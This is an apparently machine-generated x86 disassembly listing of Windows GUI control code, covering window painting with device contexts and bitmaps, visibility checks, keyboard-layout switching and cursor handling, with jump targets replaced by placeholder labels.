mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_43ed94
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_438eac
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_440d58
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_440d58
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_43b724
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_43b724
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_438eac
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_43ed94
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_414098
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_43eee8
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43ea0c
jmp r-xdata
mov eax ebx
call sub_43da88
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f03a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_440d58
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43b724
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_43eee8
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_440d58
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_43f048
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f068
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f0dc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f0fc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f11c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f140
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f164
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f188
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f1ac
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42f57c
mov edi eax
mov eax edi
call sub_42f65c
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41d64c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_440d58
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42f7f4
jmp r-xdata
sub_43f234
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43c058
test bl bl
je r-xdata
mov eax edi
call sub_441068
mov eax edi
call sub_440c60
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_440c60
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_43f2f4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43bcb4
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_43f344
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_441068
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_43d618
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403394
sub_43f38c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43a0b4
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43e644
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459fc4
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458464
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_43f4dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43f5bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f5c2
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_440d58
mov dl [ ebx + 0x184 ]
call sub_445948
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4583dc
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407dc8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4581dc
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4581dc
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4581dc
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_43f5c8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f652
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f659
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4583dc
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407dc8
test eax eax
je r-xdata
mov eax ebx
call sub_440d58
mov dl 0x1
call sub_44592c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_43f6b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412bd0
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43b724
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_43f704
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_43f738
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403394
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403394
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_43f778
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43b724
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_43f7d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419f58
mov edx [ r-xdata ]
call sub_403348
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_43f808
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_414098
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f82c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_440d58
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_43f888
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43f7f4
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_414098
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_43f8c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_40564c
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_40564c
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_43f934
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_43f9dc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f9e3
lea eax [ ebp - 0x4 ]
call sub_405634
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43821c
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403198
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405634
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403394
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_40564c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ edi + 0x178 ] eax
sub_43f9ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_43d5f0
xor edx edx
push ebp
push sub_43faae
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403394
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fab5
mov eax [ ebp - 0x4 ]
call sub_43d5f8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_43fab5
mov eax [ ebp - 0x4 ]
call sub_451710
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43a7d0
sub_43fb00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4030e0
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c3e4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_43fb6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43a7d0
sub_43fb84
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_43fbac
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_451710
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_451618
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403394
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43fbac
test al al
jne r-xdata
sub_43fc14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fbac
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_441e10
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fc40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fbac
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_441e10
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fc6c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_43fc94
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_451710
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_451618
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403394
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43fc94
test al al
jne r-xdata
sub_43fcfc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fc94
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fd1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fc94
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fd5c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_451710
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403394
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43fd5c
test al al
jne r-xdata
sub_43fdc0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fd5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fde0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43b724
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43fde0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_43fe90
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_43fde0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_451710
mov esi eax
test esi esi
